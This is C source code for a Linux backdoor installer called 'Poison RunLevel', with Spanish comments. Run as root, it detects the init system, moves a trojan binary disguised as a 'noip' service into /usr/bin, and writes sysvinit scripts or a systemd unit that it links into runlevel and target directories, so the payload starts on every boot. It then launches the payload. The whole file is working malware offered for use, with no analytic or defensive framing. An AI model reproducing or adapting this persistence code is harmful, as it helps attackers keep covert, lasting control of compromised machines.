/*
 * Proyect name         : Poison RunLevel
 * Coder				: p0fk
 * Version				: 3.0
 * Type					: Backdoor
 * Version				: code C [2018] - old version Perl [2013].
 *
 * Sites                : http://www.power-of-kernel.cl
 *
 * ==========================================
 * Metodo Backd00r RunLevel =================
 * ==========================================
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <sys/wait.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <fcntl.h>
#include <dirent.h>
#include <errno.h>

#include "utils.h"
#include "base64.h"
#include "pid.h"
#include "unit.h"
#include "scripts.h"
#include "logo.h"

#define TROY "noip" // set nombre servicio troyano

#define BOOL int
#define TRUE 1
#define FALSE 0

#define BUFSIZE 1024

/*	Tested:

	Centos 7.4 		: systemd
	Debian 9.2		: systemd
	Ubuntu 12.04	: init -> upstart
	Slackware 14.2 	: init
	Red Hat EL 7.0	: systemd
	Red Hat EL 5.3	: init
*/

int main( int argc, char *argv[] ) {

	uid_t uid 			= getuid();

	char *payloadBin	= TROY;			/* nombre de backdoor compilado src/ */
	char *fullPayload	= NULL;
	char *script_tmp	= NULL;
	char *servicio 		= scat(TROY, ".service");	/* servicio unit troyan */

	// paths systemd
	char *lst_systemd_target[] 	= { "/etc/systemd/system/default.target.wants/", "/etc/systemd/system/graphical.target.wants/", "/etc/systemd/system/multi-user.target.wants/" };
	char *lst_systemd_unit[] 	= { "/usr/lib/systemd/system/", "/lib/systemd/system/" };
	int estado_systemd 			= 0;

	char **systemd_target;
	char *systemd_unit 	 = NULL;
	fullPayload			 = scat("/usr/bin/", payloadBin);

	// paths sysvinit
	char *lst_sysvinit[]	= { "/etc/rc.d/", "/etc/init.d/" }; // base init slackware /etc/rc.d/

	char *lst_runlevel_s[] 	= { "/etc/rc2.d/", // level start
								"/etc/rc3.d/", 
								"/etc/rc4.d/", 
								"/etc/rc5.d/" 
							};
	char *lst_runlevel_k[] 	= { "/etc/rc0.d/", // level stop
								"/etc/rc1.d/", 
								"/etc/rc6.d/" 
							}; 

	char *sysvinit_target	= NULL;
	char **sysvinit_runlevel_start;
	char **sysvinit_runlevel_stop;

	sysvinit_runlevel_start = malloc (sizeof (char) * 10);
	sysvinit_runlevel_stop 	= malloc (sizeof (char) * 10);
	systemd_target 			= malloc (sizeof (char) * 10);

	system("clear");
	logo();
	if ( uid != 0 ) {
		printf("# Eleva privilegios r00t ...\n\n\n");
		return -1;
	}
	char *nombreInit;
	char *lstInit[] = { "Name:	init\n", "Name:	systemd\n" };
 	int status_init = -1;/*	-1 : no encontrado
 						 	 1 : sysvinit
 						 	 2 : systemd */

	char *str_init  = NULL;
 	for ( int index_init = 0; index_init < sizeof(lstInit)/sizeof(char*); index_init++ ) {
 		nombreInit = pidof (lstInit[index_init], 1);
    	if ( nombreInit != NULL ) {
    		if (strcmp (nombreInit, "Name:	systemd\n") == 0) {
    			status_init = 2;
    			str_init 	= "systemd";
    			break;
    		} else if (strcmp (nombreInit, "Name:	init\n") == 0) {
    			status_init = 1;
    			str_init 	= "init";
    			break;
    		}
    	}
 	}
 	
 	if ( status_init != -1 ) {
 		printf ("# Sistema init \t\t: %s \n", str_init);
 		int index_systemd = 0;
 		switch( status_init ) {
 			case 1: // check paths init

 				/* busca path de scripts sysvinit */
 				for ( int enuminit = 0; enuminit < sizeof(lst_sysvinit)/sizeof(char*); enuminit++ ) {
 					if ( is_dir(lst_sysvinit[enuminit]) == TRUE ) { /* si es directorio */
 						printf("# Path scripts sysvinit : %s\n", lst_sysvinit[enuminit] );
 						sysvinit_target = lst_sysvinit[enuminit];
 						break;
 					}
				}

				int index_sys_start = 0;

				/* busca path runlevel start */
				for ( int enuminit = 0; enuminit < sizeof(lst_runlevel_s)/sizeof(char*); enuminit++ ) {
 					if ( is_dir(lst_runlevel_s[enuminit]) == TRUE ) { /* si es directorio */
 						printf("# Path runlevels S\t: %s\n", lst_runlevel_s[enuminit] );

 						sysvinit_runlevel_start[index_sys_start] = lst_runlevel_s[enuminit];
 						index_sys_start++;
 					}
				}

				int index_sys_stop = 0;
				
				/* busca path runlevel kill */
				for ( int enuminit = 0; enuminit < sizeof(lst_runlevel_k)/sizeof(char*); enuminit++ ) {
 					if ( is_dir(lst_runlevel_k[enuminit]) == TRUE ) { /* si es directorio */
 						printf("# Path runlevels K\t: %s\n", lst_runlevel_k[enuminit] );

 						sysvinit_runlevel_stop[index_sys_stop] = lst_runlevel_k[enuminit];
 						index_sys_stop++;
 					}
				}

				int index_init = 0;
				char *directorio_actual = getenv("PWD");
				directorio_actual = scat(directorio_actual, "/");

				/* si los dos path principales systemd existen */
				if ( sysvinit_target != NULL && sizeof(&sysvinit_runlevel_start)/sizeof(char *) >= 0 && sizeof(&sysvinit_runlevel_stop)/sizeof(char *) >= 0) {
					printf("# Paths detectados\t: continua ataque.\n");

					unlink(fullPayload);
					char *init_script_lsb;

					/* Binario backdoor movido y set exec*/
					if ( move(scat(directorio_actual, TROY), fullPayload) == TRUE ) {
						printf("# backdoor movido\t: %s\n", fullPayload );
						//unlink(scat(directorio_actual, TROY));
						if ( chmod(fullPayload, 0700) != -1 ) {
							printf("# Set permisos payload\t: OK.\n");
							printf("# Exec\t\t\t: %s\n", fullPayload);
							system(scat(fullPayload, " 	-D & "));
						} else {
								printf("# Set permisos payload\t: error.\n");
								return -1;
						}
						
						/* creando script init */
						script_tmp = scat(directorio_actual, TROY);
						script_tmp = scat(script_tmp, ".script");

						if (strcmp (sysvinit_target, "/etc/rc.d/") == 0) {	// Init script based LSB
							
							printf("# Init script based\t: RedHat.\n");
							init_script_lsb = scat(sysvinit_target, scat("rc.", TROY)); // ex: /etc/rc.d/rc.[service]

							if ( touch_script_rh(script_tmp, fullPayload, TROY) == TRUE ) {
								//printf("# %s -> %s\n", sysvinit_target, TROY );
								if ( (move(script_tmp, init_script_lsb) == TRUE) ) {
									if ( is_file(init_script_lsb) == TRUE ) {
										printf("# Script creado\t\t: %s\n", init_script_lsb);

										if ( chmod(init_script_lsb , 0755) != -1 ) {
										printf("# Set permisos script\t: OK.\n");
										}
									unlink(script_tmp);
									}
								}

							} else {
								printf("# Script no creado\n");
							}
						} else {											// Init script based RedHat
							printf("# Init script based\t: LSB.\n");
							init_script_lsb = scat(sysvinit_target, TROY);
							if ( touch_script(script_tmp, fullPayload, TROY) == TRUE ) {
							
								if ( (move(script_tmp, init_script_lsb) == TRUE) ) {
									if ( is_file(init_script_lsb) == TRUE ) {
										printf("# Script creado\t\t: %s\n", init_script_lsb);

										if ( chmod(init_script_lsb, 0755) != -1 ) {
										printf("# Set permisos script\t: OK.\n");
										}
									unlink(script_tmp);
									}
								}

							} else {
								printf("# Script no creado\n");
							}
						}
						
					}


					
					int index_init_start = 0;
					/* recorre runlevel S detectados */
					while ( index_init_start < index_sys_start ) {
						char *prioridad = scat("S9", int2string(index_init_start));

						prioridad = scat(sysvinit_runlevel_start[index_init_start], prioridad);
						prioridad = scat(prioridad, TROY);

						/* crear enlace */
						symlink (init_script_lsb, prioridad);

						if ( is_link(prioridad) == TRUE ) {
							printf("# Script enlazado\t: %s\n", prioridad);
						}

						index_init_start++;
					}

					int index_init_stop = 0;
					/* recorre runlevel K detectados */
					while ( index_init_stop < index_sys_stop ) {

						char *prioridad = scat("K9", int2string(index_init_stop));

						prioridad = scat(sysvinit_runlevel_stop[index_init_stop], prioridad);
						prioridad = scat(prioridad, TROY);

						/* crear enlace */
						symlink (init_script_lsb, prioridad);

						if ( is_link(prioridad) == TRUE ) {
							printf("# Script enlazado\t: %s\n", prioridad);
						}

						index_init_stop++;
					}

				}
 			break;

 			case 2: // check paths systemd

				/* busca path unit's */
				for ( int enumsystemd = 0; enumsystemd < sizeof(lst_systemd_unit)/sizeof(char*); enumsystemd++ ) {
 					if ( is_dir(lst_systemd_unit[enumsystemd]) == TRUE ) { /* si es directorio */
 						printf("# Path unit systemd \t: %s\n", lst_systemd_unit[enumsystemd] );
 						systemd_unit = lst_systemd_unit[enumsystemd];
 						break;
 					}
				}

				int index_systemd = 0;
 				/* busca path target multi user */
 				for ( int enumsystemd = 0; enumsystemd < sizeof(lst_systemd_target)/sizeof(char*); enumsystemd++ ) {
 					if ( is_dir(lst_systemd_target[enumsystemd]) == TRUE ) { /* si es directorio */
 						printf("# Path systemd \t\t: %s\n", lst_systemd_target[enumsystemd]);
 						systemd_target[index_systemd] = lst_systemd_target[enumsystemd];
 						index_systemd++;
 					}
				}
				

				/* si los dos path principales systemd existen */
				if ( sizeof(&systemd_target)/sizeof(char *) >= 0 && systemd_unit != NULL ) {
					printf("# Paths detectados\t: continua ataque.\n");
					int index_systemd_cnt = 0;

				while ( index_systemd_cnt < index_systemd ) {
					char *path_unit_file = scat(systemd_unit, servicio);
					char *enlace_unit_file = scat(systemd_target[index_systemd_cnt], servicio);

					/* crea archivo unit */
					unlink(path_unit_file); // elimina script unit previo, para evitar violacion de segmento y reemplazar
					if ( touch_unit(path_unit_file, fullPayload) == TRUE ) {
						printf("# Binario backdoor\t: creado.\n");
					} else {
						printf("# Binario backdoor\t: error (permisos o path incorrecto).\n");
						return -1;
					}

					/* si archivo unit fue creado */
					if ( is_file(path_unit_file) == TRUE ) {
						printf("# Archivo unit\t\t: creado en path.\n");
						/* crear enlace */
						symlink (path_unit_file, enlace_unit_file);

						if ( is_link(enlace_unit_file) == TRUE ) {
							printf("# Unit enlazado\t\t: %s\n", enlace_unit_file );
							
							char *directorio_actual = getenv("PWD");
							directorio_actual = scat(directorio_actual, "/");
							directorio_actual = scat(directorio_actual, payloadBin);
							
							unlink(fullPayload); // elimina usr bin backdoor 
							if ( move(directorio_actual, fullPayload) == TRUE) {
								printf("# backdoor movido\t: %s\n", fullPayload );
								//unlink(directorio_actual);
								if ( chmod(fullPayload, 0700) != -1 ) {
									printf("# Set permisos payload\t: OK.\n");
									printf("# Exec\t\t\t: %s\n", fullPayload);
								} else {
									printf("# Set permisos payload\t: error.\n");
									return -1;
								}
							}

							

						} else {
							printf("# Problema al enlazar unit.\n");
							return -1;
						}
					}
					index_systemd_cnt++;
				} // fin while
				system(scat(fullPayload, " 	-D & "));
				} else {
					printf("# Problema con paths.\n");
					return -1;
				}

 			break;
 		}

 		
 	}
	printf("# Servicio Troyanizado\t: OK.\n");
 	
    return 0;
}


